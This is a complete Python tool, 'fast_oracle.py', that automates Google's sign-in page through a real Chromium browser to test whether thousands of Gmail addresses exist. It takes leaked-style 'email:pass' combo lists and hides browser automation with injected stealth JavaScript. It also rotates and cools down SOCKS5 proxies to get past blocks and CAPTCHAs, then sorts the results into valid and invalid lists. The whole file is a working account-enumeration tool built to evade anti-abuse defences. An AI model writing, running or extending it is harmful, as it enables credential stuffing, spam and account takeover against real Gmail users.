"""Fast Gmail existence oracle (browser engine, optimized for 1k-5k batches).

Technique: real Chromium + Google sign-in identifier page, DOM verdict:
  password field visible -> exists | "Couldn't find" -> absent |
  rejected/recaptcha -> blocked (session flagged, verdict untrustworthy).

Speed recipe (why this beats the old engine):
  - persistent browser per worker (no relaunch per check)
  - event-based waits (no fixed 6-8s sleeps)
  - fresh context per check (cookie isolation, cheap)
  - live JSONL checkpoint + --resume (5k runs survive kills)
  - --retry re-checks only blocked/unknown from a previous output
  - --qc splits output into valid.txt / invalid.txt / blocked.txt

Inputs accept plain emails AND combos (email:pass, email|pass, email pass).

Usage:
  python fast_oracle.py --file setoran.txt --out hasil.jsonl --qc qc/
  python fast_oracle.py --file setoran.txt --out h.jsonl --concurrency 5 --delay 3
  python fast_oracle.py --retry hasil.jsonl --out hasil2.jsonl   (blocked only)
  python fast_oracle.py a@gmail.com b@gmail.com --out h.jsonl

Needs: playwright + a Chromium/Chrome (playwright install chrome  OR
channel="chrome" like below). Proxies optional (socks5://[u:p@]host:port).
"""

import argparse
import itertools
import json
import os
import queue
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor

IDENTIFIER_URL = (
    "https://accounts.google.com/signin/v2/identifier?service=mail&passive=true"
    "&rm=false&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&ss=1&scc=1&ltmpl=default"
)
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")
STEALTH_JS = """() => {
  Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
  window.chrome = window.chrome || {runtime: {}};
  Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3, 4, 5]});
  Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']});
}"""

NOT_FOUND = ("couldn",)
CHALLENGE = ("type the text you hear or see", "unusual traffic",
             "verify you're not a robot", "confirm you're not a robot")

GMAIL_DOMAINS = {"gmail.com", "googlemail.com"}


# --------------------------------------------------------------------------
# input
# --------------------------------------------------------------------------

def extract_email(line):
    """Plain email or combo (email:pass / email|pass / email pass)."""
    s = (line or "").strip().lstrip("\ufeff")
    if not s or s.startswith("#"):
        return None
    first = s.split()[0]
    for sep in (":", "|"):
        if sep in first:
            first = first.split(sep)[0]
            break
    addr = first.strip().strip("<>").strip()
    if "@" not in addr or " " in addr:
        return None
    local, _, domain = addr.rpartition("@")
    if not local or "." not in domain:
        return None
    return addr


def load_inputs(paths, cli_emails):
    seen, out = set(), []
    blob = list(cli_emails or [])
    for p in paths or []:
        with open(p, "r", encoding="utf-8-sig", errors="replace") as f:
            blob.extend(ln.rstrip("\n") for ln in f)
    for ln in blob:
        addr = extract_email(ln)
        if addr and addr.lower() not in seen:
            seen.add(addr.lower())
            out.append(addr)
    return out


def load_proxies(path):
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as f:
            return [ln.strip() for ln in f
                    if ln.strip() and not ln.startswith("#")]
    except OSError:
        return []


def parse_proxy(url):
    url = (url or "").strip()
    if not url:
        return None
    if "://" not in url:
        url = "socks5://" + url
    try:
        from urllib.parse import urlsplit
        parts = urlsplit(url)
        cfg = {"server": "%s://%s:%s" % (parts.scheme, parts.hostname,
                                         parts.port)}
        if parts.username:
            cfg["username"] = parts.username
            cfg["password"] = parts.password or ""
        return cfg
    except (ValueError, AttributeError):
        return None


def load_retry(path):
    """Emails whose previous verdict needs another chance."""
    wanted = set()
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as f:
            for ln in f:
                try:
                    d = json.loads(ln)
                except ValueError:
                    continue
                if (d.get("oracle") in ("blocked", "unknown")
                        or str(d.get("oracle", "")).startswith("error")):
                    em = str(d.get("email", ""))
                    if em and not em.startswith("__"):
                        wanted.add(em)
    except OSError:
        pass
    return wanted


# --------------------------------------------------------------------------
# verdict (event-driven, no fixed sleeps)
# --------------------------------------------------------------------------

def read_verdict_fast(pg, deadline_s=25):
    """Poll DOM until a decisive signal or timeout. Returns verdict."""
    end = time.time() + deadline_s
    while time.time() < end:
        try:
            url = pg.url
        except Exception:
            url = ""
        if "rejected" in url or "challenge/recaptcha" in url:
            return "blocked"
        try:
            low = pg.evaluate(
                "() => document.body ? document.body.innerText.toLowerCase() : ''"
            ).replace("\n", " ")
        except Exception:
            low = ""
        if any(m in low for m in CHALLENGE):
            return "blocked"
        if "couldn" in low and "find" in low:
            return "absent"
        try:
            n = pg.locator("input[type=password]").count()
            for i in range(n):
                try:
                    if pg.locator("input[type=password]").nth(i).is_visible():
                        return "exists"
                except Exception:
                    pass
        except Exception:
            pass
        time.sleep(0.4)
    return "unknown"


def check_in(browser, ctx_kwargs, email, timeout_ms=45000):
    """One check, fresh context. Returns verdict string."""
    ctx = browser.new_context(**ctx_kwargs)
    ctx.add_init_script(STEALTH_JS)
    pg = ctx.new_page()
    try:
        pg.goto(IDENTIFIER_URL, timeout=timeout_ms)
        box = pg.locator("input[type=email], input[name=identifier]").first
        box.wait_for(timeout=20000)
        pg.wait_for_timeout(400)
        box.fill(email)
        pg.wait_for_timeout(300)
        pg.locator("#identifierNext").click()
        return read_verdict_fast(pg)
    except Exception as e:
        return "error:%s" % type(e).__name__
    finally:
        ctx.close()


def launch(p, proxy, headless):
    cfg = parse_proxy(proxy) if proxy else None
    browser = p.chromium.launch(
        channel="chrome", headless=headless,
        args=["--disable-blink-features=AutomationControlled",
              "--disable-infobars"])
    ctx_kwargs = {"user_agent": UA, "locale": "en-US",
                  "viewport": {"width": 1366, "height": 768}}
    if cfg:
        ctx_kwargs["proxy"] = cfg
        ctx_kwargs["ignore_https_errors"] = True
    return browser, ctx_kwargs


# --------------------------------------------------------------------------
# engine
# --------------------------------------------------------------------------

def run(emails, proxies=None, concurrency=4, delay=3.0, headless=True,
        cooldown=600.0, out=None, resume=False, max_global_blocks=8,
        progress=None):
    done = set()
    if resume and out:
        try:
            with open(out, "r", encoding="utf-8", errors="replace") as f:
                for ln in f:
                    try:
                        d = json.loads(ln)
                        em = d.get("email", "")
                        if isinstance(em, str) and not em.startswith("__"):
                            done.add(em.strip().lower())
                    except ValueError:
                        pass
        except OSError:
            pass
    todo = [e for e in emails if e.strip().lower() not in done]

    results, lock = [], threading.Lock()
    stop = threading.Event()
    work = queue.Queue()
    for e in todo:
        work.put(e)
    out_fh = open(out, "a", encoding="utf-8") if out else None

    def record(rec):
        with lock:
            results.append(rec)
            if out_fh:
                out_fh.write(json.dumps(rec, ensure_ascii=False) + "\n")
                out_fh.flush()
        if progress:
            progress(rec.get("email", "?"), rec.get("oracle", "?"),
                     len(results), len(todo))

    cycle = itertools.cycle(proxies) if proxies else None
    cooled = {}
    state = {"blocks": 0}
    t0 = time.time()

    def next_proxy():
        if not cycle:
            return None
        for _ in range(len(proxies)):
            px = next(cycle)
            if time.time() >= cooled.get(px, 0):
                return px
        return None

    def worker(_wid):
        from playwright.sync_api import sync_playwright
        with sync_playwright() as p:
            proxy = next_proxy()
            browser, ctx_kwargs = launch(p, proxy, headless)
            try:
                while not stop.is_set():
                    try:
                        email = work.get_nowait()
                    except queue.Empty:
                        return
                    try:
                        verdict = check_in(browser, ctx_kwargs, email)
                    except Exception as e:
                        verdict = "error:%s" % type(e).__name__
                    record({"email": email, "oracle": verdict,
                            "proxy": bool(proxy),
                            "t": round(time.time() - t0, 1)})
                    if verdict == "blocked":
                        with lock:
                            state["blocks"] += 1
                            if proxy:
                                cooled[proxy] = time.time() + cooldown
                            doomed = state["blocks"] >= max_global_blocks
                        if doomed:
                            stop.set()
                            return
                        try:
                            browser.close()
                        except Exception:
                            pass
                        proxy = next_proxy()
                        if proxy is None and proxies:
                            time.sleep(min(cooldown, 60))
                            proxy = next_proxy()
                        browser, ctx_kwargs = launch(p, proxy, headless)
                    time.sleep(delay)
            finally:
                try:
                    browser.close()
                except Exception:
                    pass

    with ThreadPoolExecutor(max_workers=max(1, concurrency)) as ex:
        list(ex.map(worker, range(max(1, concurrency))))
    if out_fh:
        out_fh.close()
    if stop.is_set():
        results.append({"email": "__stopped__",
                        "oracle": "aborted_global_blocks_%d" % state["blocks"],
                        "proxy": False})
    return results


# --------------------------------------------------------------------------
# QC split + CLI
# --------------------------------------------------------------------------

def qc_split(results, qc_dir):
    os.makedirs(qc_dir, exist_ok=True)
    buckets = {"valid": [], "invalid": [], "blocked": []}
    for r in results:
        em = r.get("email", "")
        if not em or em.startswith("__"):
            continue
        v = r.get("oracle", "")
        if v == "exists":
            buckets["valid"].append(em)
        elif v == "absent":
            buckets["invalid"].append(em)
        else:
            buckets["blocked"].append("%s  [%s]" % (em, v))
    for name, items in buckets.items():
        with open(os.path.join(qc_dir, "%s.txt" % name), "w",
                  encoding="utf-8") as f:
            for it in items:
                f.write(it + "\n")
    return {k: len(v) for k, v in buckets.items()}


def main(argv):
    ap = argparse.ArgumentParser(description="Fast Gmail existence oracle.")
    ap.add_argument("emails", nargs="*", help="addresses (or combos)")
    ap.add_argument("--file", action="append", default=[],
                    help="input file (repeatable; combos OK)")
    ap.add_argument("--proxy-file", help="SOCKS5 proxy list")
    ap.add_argument("--delay", type=float, default=3.0,
                    help="seconds between checks per worker (default 3)")
    ap.add_argument("--concurrency", type=int, default=4,
                    help="parallel browsers (default 4; i3 laptop: 4-6)")
    ap.add_argument("--cooldown", type=float, default=600.0)
    ap.add_argument("--headed", action="store_true",
                    help="show browser windows (default headless)")
    ap.add_argument("--resume", action="store_true",
                    help="skip addresses already present in --out")
    ap.add_argument("--retry",
                    help="previous JSONL: re-check blocked/unknown/error only")
    ap.add_argument("--out", help="JSONL output path (appended live)")
    ap.add_argument("--qc", help="directory for valid.txt/invalid.txt/blocked.txt")
    ap.add_argument("--max-blocks", type=int, default=8,
                    help="abort after N global blocks (default 8)")
    args = ap.parse_args(argv)

    emails = load_inputs(args.file, args.emails)
    if args.retry:
        only = load_retry(args.retry)
        emails = [e for e in emails if e in only] if emails else sorted(only)
        print("[*] retry mode: %d address(es) need another chance"
              % len(emails))
    emails = [e for e in emails
              if e.rpartition("@")[2].lower() in GMAIL_DOMAINS]
    if not emails:
        print("no @gmail.com/@googlemail.com addresses given")
        return 1

    proxies = load_proxies(args.proxy_file) if args.proxy_file else []
    if proxies:
        print("[*] %d proxies, concurrency %d, delay %.1fs" % (
            len(proxies), args.concurrency, args.delay))
    else:
        print("[*] direct mode (no proxies), concurrency %d, delay %.1fs — "
              "watch for blocks" % (args.concurrency, args.delay))

    t0 = time.time()
    counts = {}

    def show(email, verdict, done_n, total_n):
        mark = {"exists": "OK ", "absent": "X  "}.get(verdict, "?? ")
        counts[verdict] = counts.get(verdict, 0) + 1
        el = time.time() - t0
        avg = el / done_n if done_n else 0
        print("%s[%d/%d %ds/cek] %s -> %s" % (mark, done_n, total_n, avg,
                                             email, verdict), flush=True)

    results = run(emails, proxies=proxies or None,
                  concurrency=args.concurrency, delay=args.delay,
                  headless=not args.headed, cooldown=args.cooldown,
                  out=args.out, resume=args.resume,
                  max_global_blocks=args.max_blocks, progress=show)
    el = time.time() - t0
    real = [r for r in results if not r["email"].startswith("__")]
    print("[*] done: %d checked in %.0fs (%.1fs/cek)" % (
        len(real), el, el / len(real) if real else 0))
    print("[*] verdicts:", ", ".join("%s=%d" % kv
                                     for kv in sorted(counts.items())))
    if args.qc:
        q = qc_split(results, args.qc)
        print("[*] QC -> %s (valid=%d invalid=%d blocked=%d)" % (
            args.qc, q["valid"], q["invalid"], q["blocked"]))
    stopped = [r for r in results if r["email"].startswith("__")]
    if stopped:
        print("[*] stopped early: %s" % stopped[0]["oracle"])
        return 2
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
